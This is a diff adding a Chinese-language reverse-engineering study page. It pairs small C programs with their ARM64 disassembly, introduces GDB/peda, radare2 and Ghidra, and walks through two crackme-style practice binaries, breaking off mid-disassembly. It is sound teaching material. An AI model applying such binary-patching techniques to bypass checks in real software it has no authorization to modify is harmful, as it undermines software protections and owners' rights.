+ 8e4:	ldr	w1, [sp, #36]
+ 8e8:	ldr	w0, [sp, #32]
+ 8ec:	mul	w0, w1, w0
+ 8f0:	str	w0, [sp, #36]
+       ++i;
+ 8f4:	ldr	w0, [sp, #32]
+ 8f8:	add	w0, w0, #0x1
+ 8fc:	str	w0, [sp, #32]
+   while (i &lt;= n)&#123;
+ 900:	ldr	w0, [sp, #28]
+ 904:	ldr	w1, [sp, #32]
+ 908:	cmp	w1, w0
+ 90c:	b.le	8e4 &lt;main+0x50&gt;
+   &#125;
+   printf(&quot;Sum = %d&quot;, sum);
+ 910:	ldr	w1, [sp, #36]
+ 914:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 918:	add	x0, x0, #0x998
+ 91c:	bl	750 &lt;printf@plt&gt;
+   return 0;
+ 920:	mov	w0, #0x0                   	// #0
+&#125;
+ 924:	mov	w1, w0
+ 928:	adrp	x0, 10000 &lt;__FRAME_END__+0xf578&gt;
+ 92c:	ldr	x0, [x0, #4072]
+ 930:	ldr	x3, [sp, #40]
+ 934:	ldr	x2, [x0]
+ 938:	subs	x3, x3, x2
+ 93c:	mov	x2, #0x0                   	// #0
+ 940:	b.eq	948 &lt;main+0xb4&gt;  // b.none
+ 944:	bl	710 &lt;__stack_chk_fail@plt&gt;
+ 948:	mov	w0, w1
+ 94c:	ldp	x29, x30, [sp], #48
+ 950:	ret
+</code></pre>
+<ul>
+<li>c</li>
+</ul>
+<pre><code class="c++">//DO While LOOP
+#include &lt;stdio.h&gt;
+int main() &#123;
+   int n, i, sum = 1;
+   printf(&quot;Enter a positive integer: &quot;);
+   scanf(&quot;%d&quot;, &amp;n);
+   i = 1;
+   do&#123;
+     sum *= i;
+     ++i;
+   &#125; while (i &lt;= n);
+   printf(&quot;Sum = %d&quot;, sum);
+   return 0;
+&#125;
+</code></pre>
+<ul>
+<li><p>編譯與執行結果<img src="https://hackmd.io/_uploads/HyiIW6v9a.png" alt="image"><img src="https://hackmd.io/_uploads/H1_YZpvcT.png" alt="image"></p>
+<ul>
+<li>assembly</li>
+</ul>
+</li>
+</ul>
+<pre><code class="c++">0000000000000894 &lt;main&gt;:
+//DO While LOOP
+#include &lt;stdio.h&gt;
+int main() &#123;
+ 894:	stp	x29, x30, [sp, #-48]!
+ 898:	mov	x29, sp
+ 89c:	adrp	x0, 10000 &lt;__FRAME_END__+0xf578&gt;
+ 8a0:	ldr	x0, [x0, #4072]
+ 8a4:	ldr	x1, [x0]
+ 8a8:	str	x1, [sp, #40]
+ 8ac:	mov	x1, #0x0                   	// #0
+   int n, i, sum = 1;
+ 8b0:	mov	w0, #0x1                   	// #1
+ 8b4:	str	w0, [sp, #36]
+   printf(&quot;Enter a positive integer: &quot;);
+ 8b8:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 8bc:	add	x0, x0, #0x970
+ 8c0:	bl	750 &lt;printf@plt&gt;
+   scanf(&quot;%d&quot;, &amp;n);
+ 8c4:	add	x0, sp, #0x1c
+ 8c8:	mov	x1, x0
+ 8cc:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 8d0:	add	x0, x0, #0x990
+ 8d4:	bl	740 &lt;__isoc99_scanf@plt&gt;
+   i = 1;
+ 8d8:	mov	w0, #0x1                   	// #1
+ 8dc:	str	w0, [sp, #32]
+   do&#123;
+     sum *= i;
+ 8e0:	ldr	w1, [sp, #36]
+ 8e4:	ldr	w0, [sp, #32]
+ 8e8:	mul	w0, w1, w0
+ 8ec:	str	w0, [sp, #36]
+     ++i;
+ 8f0:	ldr	w0, [sp, #32]
+ 8f4:	add	w0, w0, #0x1
+ 8f8:	str	w0, [sp, #32]
+   &#125; while (i &lt;= n);
+ 8fc:	ldr	w0, [sp, #28]
+ 900:	ldr	w1, [sp, #32]
+ 904:	cmp	w1, w0
+ 908:	b.le	8e0 &lt;main+0x4c&gt;
+   printf(&quot;Sum = %d&quot;, sum);
+ 90c:	ldr	w1, [sp, #36]
+ 910:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 914:	add	x0, x0, #0x998
+ 918:	bl	750 &lt;printf@plt&gt;
+   return 0;
+ 91c:	mov	w0, #0x0                   	// #0
+&#125;
+ 920:	mov	w1, w0
+ 924:	adrp	x0, 10000 &lt;__FRAME_END__+0xf578&gt;
+ 928:	ldr	x0, [x0, #4072]
+ 92c:	ldr	x3, [sp, #40]
+ 930:	ldr	x2, [x0]
+ 934:	subs	x3, x3, x2
+ 938:	mov	x2, #0x0                   	// #0
+ 93c:	b.eq	944 &lt;main+0xb0&gt;  // b.none
+ 940:	bl	710 &lt;__stack_chk_fail@plt&gt;
+ 944:	mov	w0, w1
+ 948:	ldp	x29, x30, [sp], #48
+ 94c:	ret
+</code></pre>
+<h2 id="範例四-函數"><a href="#範例四-函數" class="headerlink" title="範例四 ( 函數 )"></a>範例四 ( 函數 )</h2><ul>
+<li>c</li>
+</ul>
+<pre><code class="c++">#include &lt;stdio.h&gt;
+int f(int z)&#123;
+    int mul = 1, i = 1;
+    while (i &lt;= z)&#123;
+        mul *= i;
+        i++;
+    &#125;;
+    return mul;
+&#125;
+int main()&#123;
+    int i = 9;
+    printf(&quot;%d 的階乘為%d\n&quot;, i, f(i));
+    return 0;
+&#125;
+</code></pre>
+<pre><code>- 編譯與執行結果
+</code></pre>
+<p><img src="https://hackmd.io/_uploads/Hy-1aCP56.png" alt="image"><br><img src="https://hackmd.io/_uploads/H1RDp0D9p.png" alt="image"></p>
+<ul>
+<li>assembly</li>
+</ul>
+<pre><code class="c++">00000000000007a8 &lt;main&gt;:
+int main()&#123;
+ 7a8:	stp	x29, x30, [sp, #-32]!
+ 7ac:	mov	x29, sp
+    int i = 4;
+ 7b0:	mov	w0, #0x9                   	// #9
+ 7b4:	str	w0, [sp, #28]
+    printf(&quot;%d \u7684\u968e\u4e58\u70ba%d\n&quot;, i, f(i));
+ 7b8:	ldr	w0, [sp, #28]
+ 7bc:	bl	754 &lt;f&gt;
+ 7c0:	mov	w2, w0
+ 7c4:	ldr	w1, [sp, #28]
+ 7c8:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 7cc:	add	x0, x0, #0x800
+ 7d0:	bl	630 &lt;printf@plt&gt;
+    return 0;
+ 7d4:	mov	w0, #0x0                   	// #0
+&#125;
+ 7d8:	ldp	x29, x30, [sp], #32
+ 7dc:	ret
+</code></pre>
+<h2 id="範例五（swap交換）"><a href="#範例五（swap交換）" class="headerlink" title="範例五（swap交換）"></a>範例五（swap交換）</h2><ul>
+<li>c</li>
+</ul>
+<pre><code class="c++">#include &lt;stdio.h&gt;
+void swap (int a, int b);
+int main (void) &#123;
+  int i = 1234, j = 4321;
+  printf (&quot;i = %d, j = %d\n&quot; , i, j);
+  swap (i, j);
+  printf (&quot;i = %d, j = %d\n&quot; , i, j);
+  return 0;
+&#125;
+void swap (int a, int b) &#123;
+  printf (&quot;互換前:a = %d, b = %d\n&quot; , a, b);
+  int temp = a;
+  a = b;
+  b = temp;
+  printf (&quot;互換後:a = %d, b = %d\n&quot; , a, b);
+&#125;
+</code></pre>
+<ul>
+<li><p>編譯與執行結果<img src="https://hackmd.io/_uploads/ByW_ek_56.png" alt="image"><br><img src="https://hackmd.io/_uploads/BkcYey_5a.png" alt="image"></p>
+</li>
+<li><p>assembly</p>
+</li>
+</ul>
+<pre><code class="c++">00000000000007ac &lt;swap&gt;:
+void swap (int a, int b) &#123;
+ 7ac:	stp	x29, x30, [sp, #-48]!
+ 7b0:	mov	x29, sp
+ 7b4:	str	w0, [sp, #28]
+ 7b8:	str	w1, [sp, #24]
+  printf (&quot;\u4e92\u63db\u524d:a = %d, b = %d\n&quot; , a, b);
+ 7bc:	ldr	w2, [sp, #24]
+ 7c0:	ldr	w1, [sp, #28]
+ 7c4:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 7c8:	add	x0, x0, #0x838
+ 7cc:	bl	630 &lt;printf@plt&gt;
+  int temp = a;
+ 7d0:	ldr	w0, [sp, #28]
+ 7d4:	str	w0, [sp, #44]
+  a = b;
+ 7d8:	ldr	w0, [sp, #24]
+ 7dc:	str	w0, [sp, #28]
+  b = temp;
+ 7e0:	ldr	w0, [sp, #44]
+ 7e4:	str	w0, [sp, #24]
+  printf (&quot;\u4e92\u63db\u5f8c:a = %d, b = %d\n&quot; , a, b);
+ 7e8:	ldr	w2, [sp, #24]
+ 7ec:	ldr	w1, [sp, #28]
+ 7f0:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 7f4:	add	x0, x0, #0x858
+ 7f8:	bl	630 &lt;printf@plt&gt;
+&#125;
+ 7fc:	nop
+ 800:	ldp	x29, x30, [sp], #48
+ 804:	ret
+</code></pre>
+<h2 id="範例六-push與pop-堆疊"><a href="#範例六-push與pop-堆疊" class="headerlink" title="範例六(push與pop &#x3D;&#x3D;&gt;堆疊)"></a>範例六(push與pop &#x3D;&#x3D;&gt;堆疊)</h2><ul>
+<li>c</li>
+</ul>
+<pre><code class="c++">#include &lt;stdio.h&gt;
+int sum(int n1, int n2, int n3, int n4, int n5, int n6, int n7, int n8, int n9)&#123;
+    return n1 + n2 + n3 + n4 + n5 + n6 + n7 + n8 + n9;
+&#125;
+int main()&#123;
+    int result, num1 = 1, num2 = 2, num3 = 3, num4 = 4, num5 = 5, num6 = 6, num7 = 7, num8 = 8, num9 = 9;
+    result = sum(num1, num2, num3, num4, num5, num6, num7, num8, num9);
+    printf(&quot;sum is %d\n&quot;, result);
+    return 0;
+&#125;
+</code></pre>
+<ul>
+<li><p>編譯與執行結果<img src="https://hackmd.io/_uploads/rklBZJd5a.png" alt="image"><br><img src="https://hackmd.io/_uploads/H1gvZJO5T.png" alt="image"></p>
+</li>
+<li><p>assembly!</p>
+</li>
+</ul>
+<pre><code class="c++">00000000000007c4 &lt;main&gt;:
+int main()&#123;
+ 7c4:	sub	sp, sp, #0x50
+ 7c8:	stp	x29, x30, [sp, #16]
+ 7cc:	add	x29, sp, #0x10
+    int result, num1 = 1, num2 = 2, num3 = 3, num4 = 4, num5 = 5, num6 = 6, num7 = 7, num8 = 8, num9 = 9;
+ 7d0:	mov	w0, #0x1                   	// #1
+ 7d4:	str	w0, [sp, #40]
+ 7d8:	mov	w0, #0x2                   	// #2
+ 7dc:	str	w0, [sp, #44]
+ 7e0:	mov	w0, #0x3                   	// #3
+ 7e4:	str	w0, [sp, #48]
+ 7e8:	mov	w0, #0x4                   	// #4
+ 7ec:	str	w0, [sp, #52]
+ 7f0:	mov	w0, #0x5                   	// #5
+ 7f4:	str	w0, [sp, #56]
+ 7f8:	mov	w0, #0x6                   	// #6
+ 7fc:	str	w0, [sp, #60]
+ 800:	mov	w0, #0x7                   	// #7
+ 804:	str	w0, [sp, #64]
+ 808:	mov	w0, #0x8                   	// #8
+ 80c:	str	w0, [sp, #68]
+ 810:	mov	w0, #0x9                   	// #9
+ 814:	str	w0, [sp, #72]
+    result = sum(num1, num2, num3, num4, num5, num6, num7, num8, num9);
+ 818:	ldr	w0, [sp, #72]
+ 81c:	str	w0, [sp]
+ 820:	ldr	w7, [sp, #68]
+ 824:	ldr	w6, [sp, #64]
+ 828:	ldr	w5, [sp, #60]
+ 82c:	ldr	w4, [sp, #56]
+ 830:	ldr	w3, [sp, #52]
+ 834:	ldr	w2, [sp, #48]
+ 838:	ldr	w1, [sp, #44]
+ 83c:	ldr	w0, [sp, #40]
+ 840:	bl	754 &lt;sum&gt;
+ 844:	str	w0, [sp, #76]
+    printf(&quot;sum is %d\n&quot;, result);
+ 848:	ldr	w1, [sp, #76]
+ 84c:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 850:	add	x0, x0, #0x888
+ 854:	bl	630 &lt;printf@plt&gt;
+    return 0;
+ 858:	mov	w0, #0x0                   	// #0
+&#125;
+ 85c:	ldp	x29, x30, [sp, #16]
+ 860:	add	sp, sp, #0x50
+ 864:	ret
+</code></pre>
+<h2 id="範例七-遞迴函數"><a href="#範例七-遞迴函數" class="headerlink" title="範例七:遞迴函數"></a>範例七:遞迴函數</h2><ul>
+<li>c</li>
+</ul>
+<pre><code class="c++">#include &lt;stdio.h&gt;
+ double f(unsigned int i)&#123;
+   if(i &lt;= 1)
+      return 1;
+   else   return i * f(i - 1);
+&#125;
+int main()&#123;
+    int i = 14;
+    printf(&quot;%d 的階乘為%f\n&quot;, i, f(i));
+    return 0;
+&#125;
+</code></pre>
+<pre><code>- 編譯與執行結果![image](https://hackmd.io/_uploads/Syygfk_9a.png)
+</code></pre>
+<p><img src="https://hackmd.io/_uploads/rk8Bzku5a.png" alt="image"></p>
+<ul>
+<li>assembly</li>
+</ul>
+<pre><code class="c++">000000000000079c &lt;main&gt;:
+int main()&#123;
+ 79c:	stp	x29, x30, [sp, #-32]!
+ 7a0:	mov	x29, sp
+    int i = 14;
+ 7a4:	mov	w0, #0xe                   	// #14
+ 7a8:	str	w0, [sp, #28]
+    printf(&quot;%d \u7684\u968e\u4e58\u70ba%f\n&quot;, i, f(i));
+ 7ac:	ldr	w0, [sp, #28]
+ 7b0:	bl	754 &lt;f&gt;
+ 7b4:	ldr	w1, [sp, #28]
+ 7b8:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 7bc:	add	x0, x0, #0x7f0
+ 7c0:	bl	630 &lt;printf@plt&gt;
+    return 0;
+ 7c4:	mov	w0, #0x0                   	// #0
+&#125;
+ 7c8:	ldp	x29, x30, [sp], #32
+ 7cc:	ret
+</code></pre>
+<hr>
+<h1 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h1><h3 id="安裝peda"><a href="#安裝peda" class="headerlink" title="安裝peda"></a>安裝peda</h3><pre><code>git clone https://github.com/longld/peda.git ~/peda
+echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
+</code></pre>
+<h3 id="指令說明-來源-連結"><a href="#指令說明-來源-連結" class="headerlink" title="指令說明 來源&#x3D;&#x3D;&gt;連結"></a>指令說明 來源&#x3D;&#x3D;&gt;<a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10257294">連結</a></h3><ol>
+<li><code>help ( h )</code>：顯示指令簡短說明。例：help breakpoint</li>
+<li><code>file</code>：開啟檔案。等同於 gdb filename</li>
+<li><code>run</code> ( r )：執行程式，或是從頭再執行程式。</li>
+<li><code>kill</code>：中止程式的執行。</li>
+<li><code>backtrace ( bt )</code>：顯示程式呼叫的堆疊(stack)。。會顯示出上層所有的 frame 的簡略資訊。</li>
+<li><code>print ( p )</code>：印出變數內容。例：print i，印出變數 i 的內容。</li>
+<li><code>list ( l )</code>：印出程式碼。若在編譯時沒有加上 -g 參數，list 指令將無作用。</li>
+<li><code>whatis</code>：印出變數的型態。例： whatis i，印出變數 i 的型態。</li>
+<li><code>breakpoint (b, bre, break)</code>：設定中斷點<br>使用 info breakpoint (info b) 來查看已設定了哪些中斷點。<br>在程式被中斷後，使用 info line 來查看正停在哪一行。</li>
+<li><code>continue (c, cont)</code>：繼續執行。和 breakpoint 搭配使用。</li>
+<li><code>frame</code>：顯示正在執行的行數、副程式名稱、及其所傳送的參數等等 frame 資訊。<br>frame 2：看到 #2，也就是上上一層的 frame 的資訊。</li>
+<li><code>next ( n )</code>：單步執行，但遇到函式時會將呼叫的函式作為一個語句執行。</li>
+<li><code>step ( s )</code>：單步執行。但遇到函式時會進入呼叫的函式執行。</li>
+<li><code>up</code>：直接回到上一層的 frame，並顯示其 stack 資訊，如進入點及傳入的參數等。</li>
+<li><code>up 2</code>：直接回到上三層的 frame，並顯示其 stack 資訊。</li>
+<li><code>down</code>：直接跳到下一層的 frame，並顯示其 stack 資訊。<br>必須使用 up 回到上層的 frame 後，才能用 down 回到該層來。</li>
+<li><code>info</code>：顯示一些特定的資訊。如： info break，顯示中斷點，<br>info share，顯示共享函式庫資訊。</li>
+<li><code>disable</code>：暫時關閉某個 breakpoint 或 display 之功能。</li>
+<li><code>enable</code>：將被 disable 暫時關閉的功能再啟用。</li>
+<li><code>clear/delete</code>：刪除某個 breakpoint。</li>
+<li><code>attach PID</code>：載入已執行中的程式以進行除錯。其中的 PID 可由 ps 指令取得。</li>
+<li><code>detach PID</code>：釋放已 attach 的程式。</li>
+<li><code>shell</code>：執行 Shell 指令。如：shell ls，呼叫 sh 以執行 ls 指令。</li>
+<li><code>quit</code>：離開 gdb。或是按下 Ctrl+C 也行。</li>
+<li>按下<code>Enter</code>：直接執行上個指令</li>
+</ol>
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><pre><code class="c++">//PLAYGROUND.c
+#include &lt;stdio.h&gt;
+void swap (int a, int b);
+int main (void) &#123;
+  int i = 1234, j = 4321;
+  printf (&quot;i = %d, j = %d\n&quot; , i, j);
+  swap (i, j);
+  printf (&quot;i = %d, j = %d\n&quot; , i, j);
+  return 0;
+&#125;
+void swap (int a, int b) &#123;
+  printf (&quot;互換前:a = %d, b = %d\n&quot; , a, b);
+  int temp = a;
+  a = b;
+  b = temp;
+  printf (&quot;互換後:a = %d, b = %d\n&quot; , a, b);
+&#125;
+</code></pre>
+<ul>
+<li>輸入指令<code>gdb ./gdb_example</code><img src="https://hackmd.io/_uploads/rJuVxG_ca.png" alt="image"></li>
+<li>當我們將第7行終止，則交換不會產生<ul>
+<li>輸入<code>b 7</code>後運行，<code>r</code>為運行(run)                                  <img src="https://hackmd.io/_uploads/BkDZGf_cT.png" alt="image"></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="radare2技術實戰"><a href="#radare2技術實戰" class="headerlink" title="radare2技術實戰"></a>radare2技術實戰</h1><h2 id="r2用法"><a href="#r2用法" class="headerlink" title="r2用法"></a>r2用法</h2><h3 id="1-在-Radare2-中打開檔案"><a href="#1-在-Radare2-中打開檔案" class="headerlink" title="1. 在 Radare2 中打開檔案"></a>1. 在 Radare2 中打開檔案</h3><h2 id="r2-adder-2-分析檔案aaa-分析所有-3-列出函數afl-列出所有函數-4-反組譯和分析函數pdf-main-反組譯-main-函數-5-使用視覺模式進行更好的分析s-main-移動到-main-函數-V-進入視覺模式-在視覺模式中，使用箭頭鍵或-HJKL-進行導航。-按-查看鍵綁定的幫助。-6-退出-Radare2q-退出-Radare2-7-執行外部指令（例如-Python）-python3-開啟-Python3-shell-您可以使用-來執行外部指令-例如-ls-注意：-使用-pd-和-pd-n-line-來打印反彙編的指令。-使用-s-function-name-或-s-address-來移動到特定的地址或函數。-Radare2-有三種模式：CLI、Hex-Mode-和-Visual-Mode。"><a href="#r2-adder-2-分析檔案aaa-分析所有-3-列出函數afl-列出所有函數-4-反組譯和分析函數pdf-main-反組譯-main-函數-5-使用視覺模式進行更好的分析s-main-移動到-main-函數-V-進入視覺模式-在視覺模式中，使用箭頭鍵或-HJKL-進行導航。-按-查看鍵綁定的幫助。-6-退出-Radare2q-退出-Radare2-7-執行外部指令（例如-Python）-python3-開啟-Python3-shell-您可以使用-來執行外部指令-例如-ls-注意：-使用-pd-和-pd-n-line-來打印反彙編的指令。-使用-s-function-name-或-s-address-來移動到特定的地址或函數。-Radare2-有三種模式：CLI、Hex-Mode-和-Visual-Mode。" class="headerlink" title="r2 adder### 2. 分析檔案aaa #分析所有### 3. 列出函數afl          # 列出所有函數### 4. 反組譯和分析函數pdf @ main   # 反組譯 main 函數### 5. 使用視覺模式進行更好的分析s main       # 移動到 main 函數 V            # 進入視覺模式-   在視覺模式中，使用箭頭鍵或 HJKL 進行導航。-   按 ? 查看鍵綁定的幫助。### 6. 退出 Radare2q            # 退出 Radare2### 7. 執行外部指令（例如 Python）!python3     # 開啟 Python3 shell-   您可以使用! 來執行外部指令(例如 !ls)- 注意：    -   使用 pd 和 pd $n_line 來打印反彙編的指令。    -   使用 s $function_name 或 s $address 來移動到特定的地址或函數。    -   Radare2 有三種模式：CLI、Hex Mode 和 Visual Mode。"></a><code>r2 adder</code><br>### 2. 分析檔案<br><code>aaa #分析所有</code><br>### 3. 列出函數<br><code>afl          # 列出所有函數</code><br>### 4. 反組譯和分析函數<br><code>pdf @ main   # 反組譯 main 函數</code><br>### 5. 使用視覺模式進行更好的分析<br><code>s main       # 移動到 main 函數 V            # 進入視覺模式</code><br>-   在視覺模式中，使用箭頭鍵或 HJKL 進行導航。<br>-   按 <code>?</code> 查看鍵綁定的幫助。<br>### 6. 退出 Radare2<br><code>q            # 退出 Radare2</code><br>### 7. 執行外部指令（例如 Python）<br><code>!python3     # 開啟 Python3 shell</code><br>-   您可以使用<code>!</code> 來執行外部指令(例如 <code>!ls</code>)<br>- <strong>注意</strong>：<br>    -   使用 <code>pd</code> 和 <code>pd $n_line</code> 來打印反彙編的指令。<br>    -   使用 <code>s $function_name</code> 或 <code>s $address</code> 來移動到特定的地址或函數。<br>    -   Radare2 有三種模式：CLI、Hex Mode 和 Visual Mode。</h2><h2 id="範例練習1-RE-adder"><a href="#範例練習1-RE-adder" class="headerlink" title="範例練習1 &#x3D;&#x3D;&gt; RE&#x2F;adder"></a>範例練習1 &#x3D;&#x3D;&gt; RE&#x2F;adder</h2><ul>
+<li><p>當我們正常執行時，該執行檔讓我猜3個數字，可是我沒猜到<img src="https://hackmd.io/_uploads/H1LuCG_qT.png" alt="image"></p>
+</li>
+<li><p>輸入<code>r2 add</code>,再輸入<code>aaa</code>進行深入分析,為了找到<code>main</code><img src="https://hackmd.io/_uploads/BJrh7m_qp.png" alt="image"><br><img src="https://hackmd.io/_uploads/ryNEW7dqa.png" alt="image"></p>
+</li>
+<li><p>輸入<code>pdf @ main</code>逆向回去<img src="https://hackmd.io/_uploads/rk-CQXu56.png" alt="image"></p>
+</li>
+<li><p>要進入visual模式，先找到<code>main</code>函式，使用<code>s mian</code>(s for seek),再輸入<code>VV</code>進入visual模式<img src="https://hackmd.io/_uploads/BJiNwXdca.png" alt="image"><br><img src="https://hackmd.io/_uploads/BJ0sPQO9a.png" alt="image"></p>
+</li>
+<li><p>分析ture or false 找尋關鍵部分，如圖，該提顯示為1337<img src="https://hackmd.io/_uploads/rJWdjmO5a.png" alt="image"></p>
+</li>
+<li><p>確實有成功<img src="https://hackmd.io/_uploads/rJbmhQd5p.png" alt="image"></p>
+</li>
+</ul>
+<hr>
+<h2 id="範例練習2-RE-LuckyGuess"><a href="#範例練習2-RE-LuckyGuess" class="headerlink" title="範例練習2 &#x3D;&#x3D;&gt; RE&#x2F;LuckyGuess"></a>範例練習2 &#x3D;&#x3D;&gt; RE&#x2F;LuckyGuess</h2><h3 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h3><ul>
+<li>由於要先裝java的sdk，輸入:<code>sudo apt-get install -y openjdk-17-jdk</code></li>
+<li>確認java版本<img src="https://hackmd.io/_uploads/rJIdkHucp.png" alt="image"></li>
+<li>輸入<code>wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.0.1_build/ghidra_11.0.1_PUBLIC_20240130.zip </code>將檔案下載下來</li>
+<li>解壓縮檔案<code>unzip ghidra_11.0.1_PUBLIC_20240130.zip </code></li>
+<li>開始執行<code>./ghidraRun</code></li>
+</ul>
+<h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><ul>
+<li>將LuckyGuess丟進去然後開始分析<img src="https://hackmd.io/_uploads/HyyFdSd5p.png" alt="image"></li>
+<li>找到text執行檔<br>  <img src="https://hackmd.io/_uploads/HkcQFrdcT.png" alt="image"><ul>
+<li>呈現這樣<img src="https://hackmd.io/_uploads/BkbYFBu5a.png" alt="image"></li>
+</ul>
+</li>
+<li>然後要到function裡找到main函數<img src="https://hackmd.io/_uploads/HkzJ5SO56.png" alt="image"><ul>
+<li>挖出來後長這樣</li>
+</ul>
+</li>
+</ul>
+<pre><code class="c++">undefined8 main(void)
+&#123;
+  time_t tVar1;
+  char *pcVar2;
+  basic_ostream *pbVar3;
+  long lVar4;
+  undefined8 *puVar5;
+  undefined8 *puVar6;
+  byte bVar7;
+  int local_a8;
+  int local_a4;
+  uint local_a0;
+  int local_9c;
+  undefined8 local_98 [18];
+  
+  bVar7 = 0;
+  primp();
+  puVar5 = &amp;DAT_00400d80;
+  puVar6 = local_98;
+  for (lVar4 = 0x11; lVar4 != 0; lVar4 = lVar4 + -1) &#123;
+    *puVar6 = *puVar5;
+    puVar5 = puVar5 + (ulong)bVar7 * -2 + 1;
+    puVar6 = puVar6 + (ulong)bVar7 * -2 + 1;
+  &#125;
+  tVar1 = time((time_t *)0x0);
+  srand((uint)tVar1);
+  local_9c = rand();
+  local_9c = local_9c % 0x4000000;
+  local_a4 = 0;
+  local_a8 = 0;
+  while( true ) &#123;
+    if (0x16 &lt; local_a4) &#123;
+      local_a4 = local_a4 + 1;
+      pbVar3 = std::operator&lt;&lt;((basic_ostream *)std::cout,&quot;no dice.&quot;);
+      std::basic_ostream&lt;&gt;::operator&lt;&lt;((basic_ostream&lt;&gt; *)pbVar3,std::endl&lt;&gt;);
+      return 0;
+    &#125;
+    local_a4 = local_a4 + 1;
+    std::operator&lt;&lt;((basic_ostream *)std::cout,&quot;Guess? &quot;);
+    std::basic_istream&lt;&gt;::operator&gt;&gt;((basic_istream&lt;&gt; *)std::cin,&amp;local_a8);
+    if (local_a8 == local_9c) break;  //==這邊可以直接跳出迴圈==
+    if (local_a8 &lt; local_9c) &#123;
+      pcVar2 = &quot;lo&quot;;
+    &#125;
+    else &#123;
+      pcVar2 = &quot;hi&quot;;
+    &#125;
+    pbVar3 = std::operator&lt;&lt;((basic_ostream *)std::cout,pcVar2);
+    std::basic_ostream&lt;&gt;::operator&lt;&lt;((basic_ostream&lt;&gt; *)pbVar3,std::endl&lt;&gt;);
+  &#125;
+  for (local_a0 = 0; local_a0 &lt; 0x22; local_a0 = local_a0 + 1) &#123;
+    std::operator&lt;&lt;((basic_ostream *)std::cout,
+                    (byte)*(undefined4 *)(c610 + (long)(int)local_a0 * 4) ^
+                    (byte)*(undefined4 *)((long)local_98 + (long)(int)local_a0 * 4));
+  &#125;
+  return 1;
+&#125;
+</code></pre>
+<ul>
+<li>知道邏輯要跳脫while，用gdb<img src="https://hackmd.io/_uploads/ryEDjBd96.png" alt="image"></li>
+<li>先反組譯<img src="https://hackmd.io/_uploads/B1c2JI_qa.png" alt="image"></li>
+</ul>
+<pre><code class="=">0x0000000000400af8 &lt;+0&gt;:	push   rbp
+0x0000000000400af9 &lt;+1&gt;:	mov    rbp,rsp
+0x0000000000400afc &lt;+4&gt;:	sub    rsp,0xa0
+0x0000000000400b03 &lt;+11&gt;:	call   0x400a7e &lt;_Z5primpv&gt;
+0x0000000000400b08 &lt;+16&gt;:	lea    rdx,[rbp-0x90]
+0x0000000000400b0f &lt;+23&gt;:	mov    esi,0x400d80
+0x0000000000400b14 &lt;+28&gt;:	mov    eax,0x11
+0x0000000000400b19 &lt;+33&gt;:	mov    rdi,rdx
+0x0000000000400b1c &lt;+36&gt;:	mov    rcx,rax
+0x0000000000400b1f &lt;+39&gt;:	rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
+0x0000000000400b22 &lt;+42&gt;:	mov    edi,0x0
+0x0000000000400b27 &lt;+47&gt;:	call   0x400930 &lt;time@plt&gt;
+0x0000000000400b2c &lt;+52&gt;:	mov    edi,eax
+0x0000000000400b2e &lt;+54&gt;:	call   0x4008f0 &lt;srand@plt&gt;
+0x0000000000400b33 &lt;+59&gt;:	call   0x400920 &lt;rand@plt&gt;
+0x0000000000400b38 &lt;+64&gt;:	cdq    
+0x0000000000400b39 &lt;+65&gt;:	shr    edx,0x6
+0x0000000000400b3c &lt;+68&gt;:	add    eax,edx
+0x0000000000400b3e &lt;+70&gt;:	and    eax,0x3ffffff
+0x0000000000400b43 &lt;+75&gt;:	sub    eax,edx
+0x0000000000400b45 &lt;+77&gt;:	mov    DWORD PTR [rbp-0x94],eax
+0x0000000000400b4b &lt;+83&gt;:	mov    DWORD PTR [rbp-0x9c],0x0
+0x0000000000400b55 &lt;+93&gt;:	mov    DWORD PTR [rbp-0xa0],0x0
+0x0000000000400b5f &lt;+103&gt;:	jmp    0x400c27 &lt;main+303&gt;
+0x0000000000400b64 &lt;+108&gt;:	mov    esi,0x400d60
+0x0000000000400b69 &lt;+113&gt;:	mov    edi,0x6021c0
+0x0000000000400b6e &lt;+118&gt;:	call   0x4008d0 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
+0x0000000000400b73 &lt;+123&gt;:	lea    rax,[rbp-0xa0]
+0x0000000000400b7a &lt;+130&gt;:	mov    rsi,rax
+0x0000000000400b7d &lt;+133&gt;:	mov    edi,0x6020a0
+0x0000000000400b82 &lt;+138&gt;:	call   0x4008e0 &lt;_ZNSirsERi@plt&gt;
+0x0000000000400b87 &lt;+143&gt;:	mov    eax,DWORD PTR [rbp-0xa0]
+0x0000000000400b8d &lt;+149&gt;:	cmp    eax,DWORD PTR [rbp-0x94]
+0x0000000000400b93 &lt;+155&gt;:	jne    0x400bf3 &lt;main+251&gt; //提供了變數地址
+0x0000000000400b95 &lt;+157&gt;:	mov    DWORD PTR [rbp-0x98],0x0
+0x0000000000400b9f &lt;+167&gt;:	jmp    0x400bd9 &lt;main+225&gt;
+0x0000000000400ba1 &lt;+169&gt;:	mov    eax,DWORD PTR [rbp-0x98]
+0x0000000000400ba7 &lt;+175&gt;:	cdqe   
+0x0000000000400ba9 &lt;+177&gt;:	mov    eax,DWORD PTR [rbp+rax*4-0x90]
+0x0000000000400bb0 &lt;+184&gt;:	mov    edx,eax
+0x0000000000400bb2 &lt;+186&gt;:	mov    eax,DWORD PTR [rbp-0x98]
+0x0000000000400bb8 &lt;+192&gt;:	cdqe   
